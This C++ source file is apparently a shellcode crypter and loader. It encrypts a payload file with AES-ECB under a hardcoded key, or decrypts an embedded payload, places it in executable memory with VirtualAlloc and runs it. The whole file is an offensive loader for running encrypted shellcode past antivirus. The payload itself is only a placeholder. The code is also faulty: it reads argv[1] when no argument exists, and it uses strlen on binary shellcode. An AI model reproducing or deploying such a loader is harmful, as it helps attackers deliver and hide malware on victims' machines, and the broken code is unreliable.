#include <iostream>
#include "cryptopp860/modes.h"
#include "cryptopp860/aes.h"
#include "cryptopp860/filters.h"
#include "experimental/filesystem"
#include "cryptopp860/hex.h"
#include "string"
#include "fstream"
#include <Windows.h>

using std::experimental::filesystem::exists;
using namespace ::std;
using namespace CryptoPP;
static string shellcode;
static byte key[] = "0000000000513370";
static string payload = "change the value to encrypted shellcode.";


void encrypt(){
    string cipher;
    ECB_Mode<AES>::Encryption e;
    e.SetKey(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    StringSource src(shellcode, true, new StreamTransformationFilter(e, new HexEncoder(new StringSink(cipher))));
    cout << "Your encrypted Payload is: '" + cipher + "'" << endl;
}

string decrypt(){
    string decrypted;
    ECB_Mode<AES>::Decryption d;
    d.SetKey(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    StringSource src(payload, true, new HexDecoder(new StreamTransformationFilter(d, new StringSink(decrypted))));
    return decrypted;
}

int main(int argc, char* argv[]) {
    CryptoPP::byte key[ CryptoPP::AES::DEFAULT_KEYLENGTH ], iv[ CryptoPP::AES::BLOCKSIZE ];
    memset( key, 0x00, CryptoPP::AES::DEFAULT_KEYLENGTH );
    memset( iv, 0x00, CryptoPP::AES::BLOCKSIZE );

    if(argc == 1){
        if(!exists(argv[1])) {
            cout << "An Error Occurred Reading The Payload!" << endl;
            exit(1);
        }
        cout << "Encrypting Data" << endl;
        ifstream ifs(argv[1]);
        string content( (istreambuf_iterator<char>(ifs)),(istreambuf_iterator<char>()));
        shellcode = move(content);
        encrypt();
    }

    else{
        string recovered = decrypt();
        void* thePage = VirtualAlloc(0, strlen(recovered.c_str()) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // copy the decrypted code into the page
        memcpy(thePage, recovered.c_str(), strlen(recovered.c_str()) + 1);
        // invoke the code by casting it to void* and calling it
        ((void (*)())thePage)();
    }

}
